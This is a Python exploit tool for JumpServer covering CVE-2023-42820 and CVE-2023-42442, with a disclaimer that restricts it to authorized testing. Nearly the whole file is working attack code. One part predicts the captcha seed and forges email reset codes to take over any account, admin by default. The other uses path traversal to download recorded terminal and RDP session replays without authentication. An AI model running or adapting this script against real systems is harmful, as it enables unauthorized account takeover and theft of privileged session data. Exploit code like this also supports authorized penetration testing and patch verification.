# coding: utf-8
"""
Disclaimer: This tool is only intended for legally authorized enterprise security construction activities,
such as internal attack and defense drills, vulnerability verification, and retesting. If you need to test the
usability of this tool, please build your own target environment. When using this tool for testing, you should ensure
that the behavior complies with local laws and regulations and has obtained sufficient authorization. Do not use
against unauthorized targets. If you engage in any illegal behavior during the use of this tool, you shall bear the
corresponding consequences on your own, and we will not assume any legal or joint liability

CVE-2023-42442、CVE-2023-42820 exploit
"""
import datetime
import gzip
import io
import json
import os
import sys
import tarfile
import tempfile
import time
import random
import string
import asyncio
import urllib3
import logging
import argparse
from urllib.parse import urlparse

# python3 -m pip install requests aiohttp beautifulsoup4
import requests
import aiohttp
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
PROXIES = {}
logger = logging.getLogger('log')

# The bellow is for CVE-2023-42820
CAPTCHA_IMAGE_SIZE = (180, 38)
CAPTCHA_PUNCTUATION = """_"',.;:-"""

DEFAULT_USER = "admin"
DEFAULT_EMAIL = "admin@mycomany.com"


class ChallengeCaptcha:
    def __init__(self, ctx):

        self.CAPTCHA_LETTER_ROTATION = (-35, 35)
        self.ctx = ctx
        self.csrfmiddlewaretoken = ""
        # captcha image size
        self.size = CAPTCHA_IMAGE_SIZE
        self.operators = ("+", "*", "-")

    def _get_csrftoken(self):
        resp = self.ctx.req.get(self.ctx.baseurl + "/core/auth/password/forget/previewing/")

        soup = BeautifulSoup(resp.text, 'html.parser')

        csrf_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})
        if csrf_input:
            self.csrfmiddlewaretoken = csrf_input['value']
        else:
            logger.debug("[-] Response status_code {}".format(resp.status_code))
            logger.debug(resp.text)
            sys.exit("[-] Get csrfmiddlewaretoken failed")

    def _math_challenge(self):
        operands = (random.randint(1, 10), random.randint(1, 10))
        operator = random.choice(self.operators)
        if operands[0] < operands[1] and "-" == operator:
            operands = (operands[1], operands[0])
        challenge = "%d%s%d" % (operands[0], operator, operands[1])
        return (
            "{}=".format(challenge),
            str(eval(challenge)),
        )

    def propagate_seed(self, text):
        """
        It will go more times if not, because _math_challenge().
        @param text: iterable
        @return: None
        """
        random.seed(self.ctx.key)
        """
        shortest 1-1= namely ['1-', '1', '=']
        longest 10*10= namely ['1', '0', '*', '1', '0', '=']
        range 3-6
        """
        for _ in text:
            _ = random.randrange(*self.CAPTCHA_LETTER_ROTATION)

        # noise random count
        for _ in range(int(self.size[0] * self.size[1] * 0.1)):
            _ = random.randint(0, self.size[0]), random.randint(0, self.size[1])

    def _get_captcha(self, text):
        """
        @param text: iterable
        @return: captcha[0] is Calculating Expressions like 1-1=, captcha[1] is Calculation Results like 0
        """
        self.propagate_seed(text)
        captcha = self._math_challenge()
        char_list = []
        for char in captcha[0]:
            if char in CAPTCHA_PUNCTUATION and len(char_list) >= 1:
                char_list[-1] += char
            else:
                char_list.append(char)
        return char_list, captcha[1]

    def _try_captcha(self):
        resp = None
        for text in ['0xx0', '0x0', '|0x0|', '|0xx0|']:
            logger.info("[*] Propagate...")
            asyncio.run(propagate(self.ctx.baseurl + self.ctx.init_captcha_url, self.ctx.propagate_count))
            time.sleep(.5)
            logger.debug("[*] Propagate {} times complete".format(self.ctx.propagate_count))

            captcha = self._get_captcha(text)
            new_captcha_key, _ = get_captcha_url(self.ctx)

            data = {
                "csrfmiddlewaretoken": self.csrfmiddlewaretoken,
                "username": self.ctx.username,
                "captcha_0": new_captcha_key,
                "captcha_1": captcha[1],
            }
            resp = self.ctx.req.post(
                self.ctx.baseurl + "/core/auth/password/forget/previewing/",
                data=data, allow_redirects=False,
                proxies=PROXIES,
            )

            if resp.status_code != 302:
                logger.debug("[-] Error captcha: {}, length {} in [{}] loop".format(captcha[0], len(captcha[0]), text))
                continue
            location_header = resp.headers.get('Location')
            token_idx = location_header.find('?token=')
            if token_idx == -1:
                logger.debug("[-] Error captcha: {}, length {} in [{}] loop".format(captcha[0], len(captcha[0]), text))
                continue

            logger.debug("[+] Captcha: {}, length {} in [{}] loop".format(captcha[0], len(captcha[0]), text))
            return captcha[0], location_header[token_idx + 7:]
        logger.debug("[-] Response status_code {}".format(resp.status_code))
        logger.error(resp.text)
        sys.exit("[-] Can't predict captcha code")

    def get_captcha_token(self):
        self._get_csrftoken()
        logger.info("[+] Get csrftoken success")
        calc_expr, token = self._try_captcha()
        return calc_expr, token


def random_string(length: int, lower=True, upper=True, digit=True, special_char=False):
    args_names = ['lower', 'upper', 'digit', 'special_char']
    args_values = [lower, upper, digit, special_char]
    args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, '!#$%&()*+,-.:;<=>?@[]^_~']
    args_string_map = dict(zip(args_names, args_string))
    kwargs = dict(zip(args_names, args_values))
    kwargs_keys = list(kwargs.keys())
    kwargs_values = list(kwargs.values())
    args_true_count = len([i for i in kwargs_values if i])
    assert any(kwargs_values), f'Parameters {kwargs_keys} must have at least one `True`'
    assert length >= args_true_count, f'Expected length >= {args_true_count}, bug got {length}'

    can_startswith_special_char = args_true_count == 1 and special_char

    chars = ''.join([args_string_map[k] for k, v in kwargs.items() if v])

    while True:
        password = list(random.choice(chars) for _ in range(length))
        for k, v in kwargs.items():
            if v and not (set(password) & set(args_string_map[k])):
                break
        else:
            if not can_startswith_special_char and password[0] in args_string_map['special_char']:
                continue
            else:
                break

    password = ''.join(password)
    return password


async def fetch_url(url):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            return response.status


async def propagate(url, count):
    tasks = [fetch_url(url) for _ in range(count)]
    status_codes = await asyncio.gather(*tasks)

    # Exception
    for _, status_code in enumerate(status_codes):
        if status_code != 200:
            print('[warning] Request exception, response status code: {}'.format(status_code))


def get_captcha_url(ctx):
    resp_captcha = ctx.req.get(
        ctx.baseurl + "/core/auth/captcha/refresh/",
        headers={"X-Requested-With": "XMLHttpRequest"},
        proxies=PROXIES,
    )
    captcha_json = resp_captcha.json()
    return captcha_json['key'], captcha_json['image_url']


def send_reset_code(ctx, token, email):
    data = {"form_type": "email", "email": email, "sms": ""}
    resp = ctx.req.post(
        ctx.baseurl + "/api/v1/authentication/password/reset-code/" + "?token=" + token,
        json=data,
        proxies=PROXIES,
    )
    if resp.status_code != 200 or resp.json()["data"] != "ok":
        logger.debug("[-] Response status_code {}".format(resp.status_code))
        logger.error(resp.text)
        sys.exit("[-] Failed to send reset code")


def verify_code(ctx, csrfmiddlewaretoken, email, email_code, token):
    data = {
        "csrfmiddlewaretoken": csrfmiddlewaretoken, "form_type": "email",
        "email": email, "sms": "", "code": email_code
    }
    resp = ctx.req.post(
        ctx.baseurl + "/core/auth/password/forgot/" + "?token=" + token, data=data, allow_redirects=False,
        proxies=PROXIES,
    )

    if resp.status_code != 302:
        logger.debug("[-] Response status_code {}".format(resp.status_code))
        logger.debug("[-] Verify code [{}] error".format(email_code))
        # logger.error(resp.text)
        return ""
    location_header = resp.headers.get('Location')
    token_idx = location_header.find('?token=')
    if token_idx == -1:
        logger.debug("[-] Response status_code {}".format(resp.status_code))
        logger.error(resp.text)
        logger.debug("[-] Verify code error, can't find reset password token in Location")
        return ""
    logger.info("[+] Verify code [{}] success".format(email_code))
    return location_header[token_idx + 7:]


def reset_passwd(ctx, csrfmiddlewaretoken, reset_token):
    new_passwd = generate_password()
    data = {
        "csrfmiddlewaretoken": csrfmiddlewaretoken,
        "new_password": new_passwd, "confirm_password": new_passwd
    }
    resp = ctx.req.post(
        ctx.baseurl + "/core/auth/password/reset/" + "?token=" + reset_token, data=data, allow_redirects=False,
        proxies=PROXIES,
    )

    if resp.status_code != 302:
        logger.debug("[-] Response status_code {}".format(resp.status_code))
        logger.error(resp.text)
        sys.exit("[-] Reset password failed")
    return new_passwd


def generate_password():
    punctuation = ["_", "@"]
    sys_rand = random.SystemRandom()
    special_passwd = [sys_rand.choice(punctuation)]
    lower_passwd = [sys_rand.choice(string.ascii_lowercase) for _ in range(4)]
    upper_passwd = [sys_rand.choice(string.ascii_uppercase) for _ in range(4)]
    digit_passwd = [sys_rand.choice(string.digits) for _ in range(3)]
    passwd_list = lower_passwd + special_passwd + upper_passwd + digit_passwd
    random.shuffle(passwd_list)
    return ''.join(passwd_list)


class ResetContext:
    def __init__(self, baseurl: str, http_session, **kwargs):
        self.baseurl = baseurl
        self.req = http_session
        self.req.headers.setdefault(
            "User-Agent",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/112.0.0.0 Safari/537.36"
        )
        self.req.headers.setdefault("Referer", self.baseurl)
        self.req.verify = False
        self.req.trust_env = False
        self.key = ""
        self.init_captcha_url = ""
        self.propagate_count = 50
        self.username = kwargs.get("username", None)
        self.user_email = kwargs.get("user_email", None)

        if self.username is None or self.username == "":
            self.username = DEFAULT_USER
        if self.user_email is None or self.user_email == "":
            self.user_email = DEFAULT_EMAIL


# The bellow is for 2023-42442
class DumpContext:
    def __init__(self, baseurl, outpath):
        self.baseurl = baseurl
        self.outpath = outpath

        gui_ext = ".replay.gz"
        cli_ext = ".cast.gz"
        # https://github.com/jumpserver/jumpserver/blob/v3.7.1/apps/assets/const/protocol.py#L13-L32
        # Only ssh k8s rdp is confirmed, while others are not very certain
        self.replay_type = {
            "ssh": cli_ext,
            "sftp": cli_ext,
            "rdp": gui_ext,
            "telnet": cli_ext,
            "vnc": cli_ext,
            "winrm": cli_ext,
            "mysql": cli_ext,
            "mariadb": cli_ext,
            "oracle": cli_ext,
            "postgresql": cli_ext,
            "sqlserver": cli_ext,
            "clickhouse": cli_ext,
            "redis": cli_ext,
            "mongodb": cli_ext,
            "k8s": cli_ext,
            "http": cli_ext,
            "chatgpt": cli_ext,
        }


def make_output_path(ctx, relative):
    out_dir = os.path.join(ctx.outpath, relative)

    try:
        os.makedirs(out_dir, mode=0o700, exist_ok=True)
    except OSError as e:
        out_dir = tempfile.mkdtemp()

    return out_dir


def get_gzip_bytes(data):
    compressed_data = io.BytesIO()
    with gzip.GzipFile(fileobj=compressed_data, mode="wb") as f:
        f.write(data)
    return compressed_data.getvalue()


def dump_sessions(ctx):
    parsed_baseurl = urlparse(ctx.baseurl)
    base_outpath = make_output_path(ctx, parsed_baseurl.hostname)

    replay_type_cnt = {}
    success = False

    sess_resp = requests.get(ctx.baseurl + "/api/v1/terminal/sessions/")
    if sess_resp.status_code != 200:
        logger.critical("[-] Exploit failed")
    sess_json = sess_resp.json()
    logger.info("[*] Found {} sessions".format(len(sess_json)))
    for s in sess_json:
        if not s["can_replay"]:
            logger.debug("[-] Session [{}] doesn't have replay file, skip".format(s["id"]))
            continue
        try:
            raw_time = datetime.datetime.strptime(s["date_start"], "%Y/%m/%d %H:%M:%S %z")
            dash_time = raw_time.strftime("%Y-%m-%d")
        except ValueError as err:
            logging.error("[-] Resolving time failed: %s", err)
            continue

        replay_ext = ctx.replay_type.get(str(s["protocol"]).lower(), None)
        if replay_ext is None:
            logger.error("Unknown protocol [{}] in session [{}], please contact developer", s["protocol"], s["id"])
            continue

        replay_url = "{}/{}/{}{}".format("/media/xpack/../replay", dash_time, s["id"], replay_ext)
        # Can't direct use requests.get(), see https://mazinahmed.net/blog/testing-for-path-traversal-with-python/
        if ctx.baseurl.startswith("https"):
            c_pool = urllib3.HTTPSConnectionPool
        else:
            c_pool = urllib3.HTTPConnectionPool
        pool = c_pool(parsed_baseurl.hostname, parsed_baseurl.port)
        resp = pool.urlopen("GET", replay_url)
        if resp.status != 200:
            logger.error("[-] [{}] {}".format(resp.status, replay_url))
            continue

        json_bytes = json.dumps(s).encode("utf-8")
        gz_bytes = get_gzip_bytes(resp.data)

        # TODO: distinguish the output into specific protocol path or host names for readability of the output file?
        # note: The filename here must be id.tar, otherwise the jumpserver player cannot play it
        out_path = "{}/{}.tar".format(base_outpath, s["id"])
        with tarfile.open(out_path, mode='w') as tar:
            gz_stream = io.BytesIO(gz_bytes)
            gz_info = tarfile.TarInfo(name=s["id"] + replay_ext)
            gz_info.size = len(gz_bytes)
            tar.addfile(gz_info, gz_stream)
            json_stream = io.BytesIO(json_bytes)
            json_info = tarfile.TarInfo(name=s["id"] + ".json")
            json_info.size = len(json_bytes)
            tar.addfile(json_info, json_stream)

        success = True
        replay_type_cnt[s["protocol"]] = replay_type_cnt.get(s["protocol"], 0) + 1
        logger.info("[+] {}".format(out_path))

    if not success:
        logger.warning("[-] Nothing found :(")
        return

    print("| Summary: ")
    for t, tc in replay_type_cnt.items():
        print("| {}: {}".format(t, tc), end='')
    print()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="")
    subparsers = parser.add_subparsers(title="", dest="subcommand", description="")

    parser.add_argument("base_url", type=str, help="jumpserver host or url")
    parser.add_argument("--log-level", type=str, choices=["DEBUG", "INFO"], default="INFO", help="log level")
    parser.add_argument("--enable-proxy", action="store_true", help="proxy to 127.0.0.1:8080")

    reset_parser = subparsers.add_parser("reset", help="reset password")
    reset_parser.add_argument("--user", type=str, default="", help="username you want to reset")
    reset_parser.add_argument("--email", type=str, default="", help="user's email you want to reset")

    dump_parser = subparsers.add_parser("dump", help="dump sessions")
    dump_parser.add_argument("--outpath", type=str, default="output", help="session file output path")

    args = parser.parse_args()

    base_url = args.base_url
    log_level = args.log_level
    if args.enable_proxy:
        PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

    logging.basicConfig(
        level=log_level,
        format="[%(levelname)s] %(message)s"
    )

    base_url = base_url.rstrip("/")
    # FIXME: http to https redirects will lead to exploit failed
    # It should detect with http if it will redirect to https
    # or just exit this program, let user specify the schema
    if not (base_url.startswith("http") or base_url.startswith("https://")):
        base_url = "http://" + base_url

    logger.info("[*] Target url: {}".format(base_url))

    if args.subcommand == "reset":
        username = args.user
        user_email = args.email

        # Init
        context = ResetContext(base_url, requests.session(), username=username, user_email=user_email)
        logger.info("[*] Reset password for user [{}] with email [{}]".format(context.username, context.user_email))

        key, init_captcha_url = get_captcha_url(context)
        context.key = key
        context.init_captcha_url = init_captcha_url

        logger.debug("[*] Random seed: {}".format(context.key))

        # Challenge captcha
        cha_captcha = ChallengeCaptcha(context)
        expr, captcha_token = cha_captcha.get_captcha_token()
        logger.info("[+] Get captcha token success")
        asyncio.run(propagate(context.baseurl + context.init_captcha_url, context.propagate_count))
        time.sleep(1)

        send_reset_code(context, captcha_token, context.user_email)
        logger.info("[+] Send reset code success")

        """
        We don't know the length of the first graphic captcha so that
        can't accurately determine that the number of random is necessarily correct 
        eq: ['1', '0', '*', '1', '='] need random 5 times, but sometime random 4 times we get
            ['1', '0', '*'] and the next uncertain randomness happens to reach 1,
            can still get the right graphic captcha
    
        So, set the default to `calc_expr`, and the other choice prevent the above situation
        will let this exploit become more availability.
        """
        cha_captcha.propagate_seed(expr)
        code = random_string(6, False, False)
        code_list = [code]
        for s in ["xx", "xxxx", "", "xxx", "xxxxx", "x", "xxxxxx"]:
            if len(s) == len(expr):
                continue
            cha_captcha.propagate_seed(s)
            code_list.append(random_string(6, False, False))

        # Prevent server verify code before sending it
        time.sleep(1)
        for code in code_list:
            logger.info("[*] Try code: {}".format(code))
            reset_passwd_token = verify_code(
                context, cha_captcha.csrfmiddlewaretoken, context.user_email, code, captcha_token
            )
            if reset_passwd_token == "":
                continue
            new_password = reset_passwd(context, cha_captcha.csrfmiddlewaretoken, reset_passwd_token)
            logger.info("[+] Reset password for user [{}] success: {}".format(context.username, new_password))
            break
        else:
            logger.error("[-] Exploit failed")
    elif args.subcommand == "dump":
        context = DumpContext(base_url, args.outpath)
        dump_sessions(context)
    else:
        parser.print_help()
